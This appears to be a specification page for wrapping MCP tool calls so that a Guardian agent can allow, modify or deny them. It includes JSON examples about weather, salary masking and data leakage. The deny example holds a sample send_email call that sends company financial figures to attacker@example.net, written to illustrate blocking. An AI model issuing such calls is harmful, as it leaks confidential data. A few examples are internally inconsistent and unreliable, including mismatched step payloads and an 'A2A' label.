# Extending MCP

## MCP protocol
The Model Context Protocol ([MCP](https://modelcontextprotocol.io/introduction)) is an open standard for connecting AI agents to external tools, prompts, resources, and servers.

ACS-Core remains protocol-agnostic: ordinary tool invocations can be governed through `steps/toolCallRequest` and `steps/toolCallResult` regardless of whether the underlying transport is MCP, HTTP, a local function call, or another mechanism. The `protocols/MCP/*` namespace is an optional precision layer for deployments that need to preserve MCP-specific semantics on the wire.

## MCP support

ACS wrapping for MCP carries MCP messages between the Observed Agent and the Guardian while preserving the underlying MCP method and payload. This lets a Guardian apply the standard ACS disposition contract to MCP traffic without making MCP the only tool-governance path.

Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCallRequest` / `steps/toolCallResult` hooks when tool-level policy is sufficient. Deployments SHOULD use `protocols/MCP/*` when policy needs MCP-level distinctions that generic tool hooks would erase, including:

- `initialize` capability negotiation, including server instructions and capability grants that occur before the first tool call.
- `prompts/get`, where a server-authored prompt template is fetched and may later enter the agent's LLM context.
- `resources/read` and resource subscriptions, which represent data flow rather than one-shot tool invocation.
- `notifications/*`, which represent asynchronous MCP signals.

#### To extend MCP protocol:
1. Agents using MCP and claiming MCP wrapping ***must*** deliver wrapped MCP messages to the Guardian using [`protocols/MCP/*`](hooks.md#protocolsmcp).
2. Agents using MCP wrapping ***must*** understand and enforce ACS responses before forwarding outbound MCP messages or consuming inbound MCP results.

#### The following flow explains how this should be done:
1. Agent **A** prepares an MCP-compliant message.
2. Agent **A** uses ACS as a transport to send the message to the guardian agent.
3. The Guardian understands and processes the wrapped MCP message and sends the result back to agent **A**.
4. Agent **A** interprets and enforces the response from guardian agent.
5. If the response is `allow`, agent **A** sends the MCP message to the MCP server.
6. MCP server processes the message and sends back to agent **A** the response.
7. Agent **A** uses ACS as a transport to send the MCP response to the guardian agent.
8. The Guardian understands and processes the wrapped MCP response and sends the result back to agent **A**.
9. Agent **A** interprets and enforces the response from guardian agent.

## Examples
### Scenario: Agent **A** asks an MCP server for the weather and the Guardian responds with allow
#### 1. Agent **A** prepares MCP `tools/call` message 

   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "city": "Barcelona"
       },
       "name": "get_weather"
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends an MCP `protocols/MCP/tools/call` message

   ```json
    {
        "jsonrpc": "2.0",
        "id": 70,
        "method": "protocols/MCP/tools/call",
        "params": {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
            "arguments": {
                "city": "Barcelona"
            },
            "name": "get_weather"
            }
        }
    }
   ```

#### 3. Guardian agent sends `allow` response to agent **A**

   ```json
        {
        "jsonrpc": "2.0",
        "id": 70,
        "result": {
            "decision": "allow",
            "message": "Allow tools/call.",
            "reasoning": "I understand that this is an MCP message. An agent is asking the weather. Nothing suspicious here."
        }
    }
   ```


### Scenario: Agent **A** asks an MCP server to send email with sensitive data and the Guardian responds with modify
#### 1. Agent **A** prepares MCP `tools/call` message 
   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "to": "hr@example.com",
           "subject": "",
           "body": ""
       },
       "name": "send_email"
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends an MCP `protocols/MCP/tools/call` message
   ```json
    {
        "jsonrpc": "2.0",
        "id": 80,
        "method": "protocols/MCP/tools/call",
        "params": {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
            "arguments": {
                "to": "finance@example.com",
                "from": "manager@example.com",
                "subject": "Employee Salary Raise Request",
                "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is 200000$, the requested salary is 300000$. Let's have a meeting discuss this."
            },
            "name": "send_email"
            }
        }
    }
   ```

#### 3. Guardian agent sends `modify` response to agent **A**
   ```json
        {
        "jsonrpc": "2.0",
        "id": 80,
        "result": {
            "decision": "modify",
            "message": "Modified data for tools/call.",
            "reasoning": "I understand that this is an MCP message. An agent is asking to send an email with sensitive info, I need to mask it first.",
            "modifiedRequest": {
                "jsonrpc": "2.0",
                "id": 80,
                "method": "protocols/MCP/tools/call",
                "params": {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {
                    "arguments": {
                        "to": "finance@example.com",
                        "from": "manager@example.com",
                        "subject": "Employee Salary Raise Request",
                        "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is **********$, the requested salary is **********$. Let's have a meeting discuss this."
                    },
                    "name": "send_email"
                    }
                }
            }
        }
    }
   ```


### Scenario: Agent **A** asks an MCP server to send email with sensitive data to an outsider and the Guardian responds with deny
#### 1. Agent **A** prepares MCP `tools/call` message 
   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "to": "attacker@example.net",
           "subject": "Financial info",
           "body": "The ARR for the company for year 2024 was 100000000000$ "
       },
       "name": "send_email"
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends an MCP `protocols/MCP/tools/call` message
   ```json
   {
     "jsonrpc": "2.0",
     "id": 100,
     "method": "protocols/MCP/tools/call",
     "params": {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
        "arguments": {
            "to": "attacker@example.net",
            "subject": "Financial info",
            "body": "The ARR for the company for year 2024 was 100000000000$ "
        },
        "name": "send_email"
        }
   }
   }
   ```

#### 3. Guardian sends `deny` response to agent **A**
   ```json
    {
        "jsonrpc": "2.0",
        "id": 100,
        "result": {
            "decision": "deny",
            "message": "Deny message/send.",
            "reasoning": "This is A2A message. I recognize disallowed content."
        }
    }
   ```  
